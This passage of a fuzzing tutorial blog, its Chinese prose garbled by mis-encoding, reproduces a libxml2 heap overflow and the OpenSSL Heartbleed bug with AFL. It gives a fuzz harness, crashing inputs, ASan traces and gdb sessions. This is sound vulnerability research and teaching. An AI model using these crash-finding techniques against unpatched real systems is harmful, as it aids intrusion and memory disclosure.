ä½¿ç”¨gdbè°ƒè¯•è·Ÿè¿›ç¡®è®¤é”™è¯¯å‡ºç°åœ¨å®å®šä¹‰å¤„ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦å¤ç°çš„é”™è¯¯&lt;/p&gt;
&lt;p&gt;å¥½åœ¨æœ‰ä¸€ä¸ªè¾“å…¥æ ·æœ¬èƒ½è§¦å‘CVEä¸­çš„é”™è¯¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/æ–‡æ¡£/fuzzing/afl-training/challenges/libxml2/libxml2/opt/default/crashes/tmp$ hexdump -C id\:000002\,sig\:06\,src\:002889\,time\:8672911\,execs\:11122815\,op\:havoc\,rep\:16 
00000000  3c 4a 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |&amp;lt;J00000000000000|
00000010  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
00000350  30 30 3a 4a 30 30 30 30  30 30 30 30 30 30 30 30  |00:J000000000000|
00000360  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
000003b0  30 30 30 30 30 30 30 30  30 30                    |0000000000|
000003ba
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å³&lt;code&gt;xmlDictComputeFastQKey&lt;/code&gt;å‡½æ•°ä¸­çš„æº¢å‡º&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;=================================================================
==3397754==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62100000123c at pc 0x556c7cb6c531 bp 0x7ffe76acfde0 sp 0x7ffe76acfdd8
READ of size 1 at 0x62100000123c thread T0
    #0 0x556c7cb6c530 in xmlDictComputeFastQKey /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/libxml2/libxml2/dict.c:489:18
    #1 0x556c7cb6a16f in xmlDictQLookup /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/libxml2/libxml2/dict.c:1093:12
    #2 0x556c7cb79590 in xmlSAX2StartElementNs /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/libxml2/libxml2/SAX2.c:2238:17
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;binary ninjaæŸ¥çœ‹è°ƒç”¨&lt;code&gt;xmlDictComputeFastQKey&lt;/code&gt;å‡½æ•°çš„åç§»&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696223625979.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
gdbæ–­ç‚¹æ‰“è¿‡å»:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gdb --args ../fuzzer id\:000002\,sig\:06\,src\:002889\,time\:8672911\,execs\:11122815\,op\:havoc\,rep\:16 

b *$rebase(0x03de16b)

c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥å¾—åˆ°ç›¸å…³å¯„å­˜å™¨å€¼&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; â–º 0x55555593216b &amp;lt;xmlDictQLookup+235&amp;gt;    call   xmlDictComputeFastQKey                &amp;lt;xmlDictComputeFastQKey&amp;gt;
        rdi: 0x6190000000d7 â—‚â€” 0x303030303030304a (&#39;J0000000&#39;)
        rsi: 0x351
        rdx: 0x621000001528 â—‚â€” &#39;J000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#39;
        rcx: 0x67
        r8: 0x2e70efeb

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ ¹æ®&lt;code&gt;dict.c&lt;/code&gt;ä¸­å‡½æ•°ä¼ å‚è§„åˆ™ï¼Œplenå¯¹åº”&lt;code&gt;$rsi&lt;/code&gt;ï¼Œlenå¯¹åº”&lt;code&gt;$rcx&lt;/code&gt;&lt;br&gt;
&lt;code&gt;len-(plen+1+1)&lt;/code&gt;å³&lt;code&gt;0x67-(0x351+0x1+0x1)=-0x2EC&lt;/code&gt;&lt;br&gt;
ä¸‹æ ‡è´Ÿæ•°,æ•°ç»„è¶Šç•Œ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static unsigned long
xmlDictComputeFastQKey(const xmlChar *prefix, int plen,
                       const xmlChar *name, int len, int seed)
{
    unsigned long value = (unsigned long) seed;

    if (plen == 0)
	value += 30 * (unsigned long) &#39;:&#39;;
    else
	value += 30 * (*prefix);

    if (len &amp;gt; 10) {
        value += name[len - (plen + 1 + 1)];
        len = 10;
	if (plen &amp;gt; 10)
	    plen = 10;
    }
    switch (plen) {
        case 10: value += prefix[9];
        case 9: value += prefix[8];
        case 8: value += prefix[7];
        case 7: value += prefix[6];
        case 6: value += prefix[5];
        case 5: value += prefix[4];
        case 4: value += prefix[3];
        case 3: value += prefix[2];
        case 2: value += prefix[1];
        case 1: value += prefix[0];
        default: break;
    }
    len -= plen;
    if (len &amp;gt; 0) {
        value += (unsigned long) &#39;:&#39;;
	len--;
    }
    switch (len) {
        case 10: value += name[9];
        case 9: value += name[8];
        case 8: value += name[7];
        case 7: value += name[6];
        case 6: value += name[5];
        case 5: value += name[4];
        case 4: value += name[3];
        case 3: value += name[2];
        case 2: value += name[1];
        case 1: value += name[0];
        default: break;
    }
    return(value);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;heartbleed&#34;&gt;heartbleed:&lt;/h2&gt;
&lt;h3 id=&#34;å‰è¨€-2&#34;&gt;å‰è¨€ï¼š&lt;/h3&gt;
&lt;p&gt;æœ¬æ–‡è®°å½•afl-trainingçš„ç¬¬äºŒç¯‡ï¼Œå¤ç°å¿ƒè„æ»´è¡€æ¼æ´&lt;/p&gt;
&lt;h3 id=&#34;å‡†å¤‡å·¥ä½œ-2&#34;&gt;å‡†å¤‡å·¥ä½œï¼š&lt;/h3&gt;
&lt;p&gt;è®¾ç½®ç¯å¢ƒå˜é‡ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export CC=afl-clang-fast CXX=afl-clang-fast++ AFL_USE_ASAN=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶åï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./config -d
make
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨åŸæ¥çš„&lt;code&gt;handshake.cc&lt;/code&gt;ä¸Šä½œä¿®æ”¹ï¼Œåœ¨&lt;code&gt;BIO_write&lt;/code&gt;å‰åˆå§‹åŒ–&lt;code&gt;size&lt;/code&gt;å’Œ&lt;code&gt;data&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;// Copyright 2016 Google Inc. All Rights Reserved.
// Licensed under the Apache License, Version 2.0 (the &amp;quot;License&amp;quot;);
#include &amp;lt;openssl/ssl.h&amp;gt;
#include &amp;lt;openssl/err.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;stdint.h&amp;gt;
#include &amp;lt;stddef.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

#ifndef CERT_PATH
# define CERT_PATH
#endif

SSL_CTX *Init() {
  SSL_library_init();
  SSL_load_error_strings();
  ERR_load_BIO_strings();
  OpenSSL_add_all_algorithms();
  SSL_CTX *sctx;
  assert (sctx = SSL_CTX_new(TLSv1_method()));
  /* These two file were created with this command:
      openssl req -x509 -newkey rsa:512 -keyout server.key \
     -out server.pem -days 9999 -nodes -subj /CN=a/
  */
  assert(SSL_CTX_use_certificate_file(sctx, &amp;quot;server.pem&amp;quot;,
                                      SSL_FILETYPE_PEM));
  assert(SSL_CTX_use_PrivateKey_file(sctx, &amp;quot;server.key&amp;quot;,
                                     SSL_FILETYPE_PEM));
  return sctx;
}

int main() {
  static SSL_CTX *sctx = Init();
  SSL *server = SSL_new(sctx);
  BIO *sinbio = BIO_new(BIO_s_mem());
  BIO *soutbio = BIO_new(BIO_s_mem());
  SSL_set_bio(server, sinbio, soutbio);
  SSL_set_accept_state(server);

  /* TODO: To spoof one end of the handshake, we need to write data to sinbio
   * here */
  #ifdef __AFL_HAVE_MANUAL_CONTROL
    __AFL_INIT();
  #endif
  uint8_t data[100] = {0};
  size_t size = read(STDIN_FILENO, data, 100);
  if (size == -1) {
    printf(&amp;quot;Failed to read from stdin\n&amp;quot;);
    return(-1);
  }
  BIO_write(sinbio, data, size);

  SSL_do_handshake(server);
  SSL_free(server);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç¼–è¯‘ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-clang-fast++ ./handshake.cc -I ./include ./libssl.a ./libcrypto.a -ldl -g -o handshake
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;fuzzing&#34;&gt;Fuzzing:&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ipt&lt;/code&gt;ä¸­ç”Ÿæˆéšæœºç§å­ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd ipt &amp;amp;&amp;amp; dd if=/dev/urandom of=1.in bs=64 count=10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¼€å§‹fuzzå‰æ³¨æ„å°†&lt;code&gt;server.key server.pem&lt;/code&gt;æ”¾åœ¨å’Œ&lt;code&gt;handshake&lt;/code&gt;åŒç›®å½•ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-fuzz -i ipt/ -o opt/ -m none ./handshake
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1696483359558.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;crashåˆ†æ-2&#34;&gt;crashåˆ†æï¼š&lt;/h3&gt;
&lt;p&gt;å°†&lt;code&gt;handshake&lt;/code&gt;ç§»è‡³&lt;code&gt;crashes&lt;/code&gt;ç›®å½•ä¸‹ä½¿ç”¨&lt;code&gt;afl-tmin&lt;/code&gt;ç®€åŒ–&lt;code&gt;input&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for i in id*;do afl-tmin -i $i -o ./tmp/$i  -- ./handshake;done;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¹‹åä½¿ç”¨ç®€åŒ–åçš„&lt;code&gt;input&lt;/code&gt;æµ‹è¯•&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/æ–‡æ¡£/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp$ gdb handshake 
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type &amp;quot;show copying&amp;quot; and &amp;quot;show warranty&amp;quot; for details.
This GDB was configured as &amp;quot;x86_64-linux-gnu&amp;quot;.
Type &amp;quot;show configuration&amp;quot; for configuration details.
For bug reporting instructions, please see:
&amp;lt;https://www.gnu.org/software/gdb/bugs/&amp;gt;.
Find the GDB manual and other documentation resources online at:
    &amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.

For help, type &amp;quot;help&amp;quot;.
Type &amp;quot;apropos word&amp;quot; to search for commands related to &amp;quot;word&amp;quot;...
pwndbg: loaded 147 pwndbg commands and 46 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from handshake...
------- tip of the day (disable with set show-tips off) -------
Disable Pwndbg context information display with set context-sections &#39;&#39;
pwndbg&amp;gt; ls
handshake									 id:000006,sig:06,src:000236,time:22339456,execs:17321069,op:havoc,rep:7
id:000000,sig:06,src:000031,time:54840,execs:42018,op:havoc,rep:1		 id:000007,sig:06,src:000233,time:23634783,execs:18301688,op:havoc,rep:3
id:000001,sig:06,src:000024+000075,time:4119745,execs:3210038,op:splice,rep:17	 id:000008,sig:06,src:000294+000226,time:25859527,execs:19982226,op:splice,rep:2
id:000002,sig:06,src:000053+000041,time:5079793,execs:3956550,op:splice,rep:4	 id:000009,sig:06,src:000270,time:26541712,execs:20500629,op:havoc,rep:1
id:000003,sig:06,src:000024+000068,time:10115665,execs:7871015,op:splice,rep:12  server.key
id:000004,sig:06,src:000040+000006,time:16647584,execs:12944780,op:splice,rep:4  server.pem
id:000005,sig:06,src:000224,time:22158868,execs:17184882,op:havoc,rep:4
This command is deprecated in Pwndbg. Please use the GDB&#39;s built-in syntax for running shell commands instead: !ls &amp;lt;args&amp;gt;
pwndbg&amp;gt; run &amp;lt; id:000000,sig:06,src:000031,time:54840,execs:42018,op:havoc,rep:1
Starting program: /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake &amp;lt; id:000000,sig:06,src:000031,time:54840,execs:42018,op:havoc,rep:1
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
=================================================================
==7701==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x5555556f96d7 bp 0x7fffffffd4d0 sp 0x7fffffffcca0
READ of size 25648 at 0x629000009748 thread T0
[Attaching after Thread 0x7ffff7e99800 (LWP 7701) fork to child process 7704]
[New inferior 2 (process 7704)]
[Detaching after fork from parent process 7701]
[Inferior 1 (process 7701) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
process 7704 is executing new program: /usr/lib/llvm-14/bin/llvm-symbolizer
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
    #0 0x5555556f96d6 in __asan_memcpy (/home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x1a56d6) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641)
    #1 0x555555744ca1 in tls1_process_heartbeat /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/t1_lib.c:2586:3
    #2 0x5555557b9129 in ssl3_read_bytes /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_pkt.c:1092:4
    #3 0x5555557bdcd9 in ssl3_get_message /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_both.c:457:7
    #4 0x555555786696 in ssl3_get_client_hello /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_srvr.c:941:4
    #5 0x5555557823ec in ssl3_accept /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_srvr.c:357:9
    #6 0x555555737a7f in main /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/heartbleed/openssl/./handshake.cc:53:3
    #7 0x7ffff7829d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #8 0x7ffff7829e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #9 0x555555677564 in _start (/home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x123564) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641)

0x629000009748 is located 0 bytes to the right of 17736-byte region [0x629000005200,0x629000009748)
allocated by thread T0 here:
    #0 0x5555556fa3ae in malloc (/home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x1a63ae) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641)
    #1 0x5555557f0ee9 in CRYPTO_malloc /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/heartbleed/openssl/crypto/mem.c:308:8

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x1a56d6) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641) in __asan_memcpy
Shadow bytes around the buggy address:
  0x0c527fff9290: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=&amp;gt;0x0c527fff92e0: 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa
  0x0c527fff92f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9310: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==7701==ABORTING
[Inferior 2 (process 7704) exited normally]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å®šä½åˆ°&lt;code&gt;t1_lib.c&lt;/code&gt;ä¸­çš„&lt;code&gt;tls1_process_heartbeat&lt;/code&gt;çš„&lt;code&gt;memcpy(bp, pl, payload);&lt;/code&gt;å³æ˜¯è§¦å‘å¿ƒè„æ»´è¡€çš„å…³é”®ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;*RIP  0x555555744c9d (tls1_process_heartbeat+765) â—‚â€” call 0x5555556f9520
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86-64 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   0x555555744c89 &amp;lt;tls1_process_heartbeat+745&amp;gt;    jne    tls1_process_heartbeat+1249                &amp;lt;tls1_process_heartbeat+1249&amp;gt;
 
   0x555555744c8f &amp;lt;tls1_process_heartbeat+751&amp;gt;    mov    byte ptr [rbx + 2], r12b
   0x555555744c93 &amp;lt;tls1_process_heartbeat+755&amp;gt;    lea    rdi, [rbx + 3]
   0x555555744c97 &amp;lt;tls1_process_heartbeat+759&amp;gt;    mov    rsi, r15
   0x555555744c9a &amp;lt;tls1_process_heartbeat+762&amp;gt;    mov    rdx, rbp
 â–º 0x555555744c9d &amp;lt;tls1_process_heartbeat+765&amp;gt;    call   __asan_memcpy                &amp;lt;__asan_memcpy&amp;gt;
        rdi: 0x62b000000203 â—‚â€” 0xbebebebebebebebe
        rsi: 0x62900000520b â—‚â€” 0xbebebebebebebebe
        rdx: 0x6430
        rcx: 0x55555662f720 (__afl_area_initial) â—‚â€” 0x1000000000002
 
   0x555555744ca2 &amp;lt;tls1_process_heartbeat+770&amp;gt;    lea    rdi, [rbx + rbp]
   0x555555744ca6 &amp;lt;tls1_process_heartbeat+774&amp;gt;    add    rdi, 3
   0x555555744caa &amp;lt;tls1_process_heartbeat+778&amp;gt;    mov    esi, 0x10
   0x555555744caf &amp;lt;tls1_process_heartbeat+783&amp;gt;    call   RAND_pseudo_bytes                &amp;lt;RAND_pseudo_bytes&amp;gt;
 
   0x555555744cb4 &amp;lt;tls1_process_heartbeat+788&amp;gt;    mov    rdi, qword ptr [rsp + 0x10]
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
In file: /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/t1_lib.c
   2581                 bp = buffer;
   2582                 
   2583                 /* Enter response type, length and copy payload */
   2584                 *bp++ = TLS1_HB_RESPONSE;
   2585                 s2n(payload, bp);
 â–º 2586                 memcpy(bp, pl, payload);
   2587                 bp += payload;
   2588                 /* Random padding */
   2589                 RAND_pseudo_bytes(bp, padding);
   2590 
   2591                 r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
00:0000â”‚ rsp 0x7fffffffd4e0 â€”â–¸ 0xc34000001b0 â—‚â€” 0x0
01:0008â”‚     0x7fffffffd4e8 â€”â–¸ 0x6180000000f0 â—‚â€” 0x0
02:0010â”‚     0x7fffffffd4f0 â€”â–¸ 0x618000000080 â—‚â€” 0x200000000301
03:0018â”‚     0x7fffffffd4f8 â—‚â€” 0x644300005203
04:0020â”‚     0x7fffffffd500 â€”â–¸ 0x618000000118 â—‚â€” 0x0
05:0028â”‚     0x7fffffffd508 â€”â–¸ 0x7fffffffd640 â—‚â€” 0x3fff800
06:0030â”‚     0x7fffffffd510 â€”â–¸ 0x7fffffffd540 â—‚â€” 0x41b58ab3
07:0038â”‚     0x7fffffffd518 â€”â–¸ 0xc34000001b6 â—‚â€” 0x0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º 0   0x555555744c9d tls1_process_heartbeat+765
   1   0x5555557b912a ssl3_read_bytes+13306
   2   0x5555557bdcda ssl3_get_message+538
   3   0x555555786697 ssl3_get_client_hello+535
   4   0x5555557823ed ssl3_accept+3405
   5   0x555555737a80 main+448
   6   0x7ffff7829d90 __libc_start_call_main+128
   7   0x7ffff7829e40 __libc_start_main+128
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
pwndbg&amp;gt; ni
=================================================================
==8348==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x5555556f96d7 bp 0x7fffffffd4d0 sp 0x7fffffffcca0
READ of size 25648 at 0x629000009748 thread T0
[Attaching after Thread 0x7ffff7e99800 (LWP 8348) fork to child process 8359]
[New inferior 2 (process 8359)]
[Detaching after fork from parent process 8348]
[Inferior 1 (process 8348) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
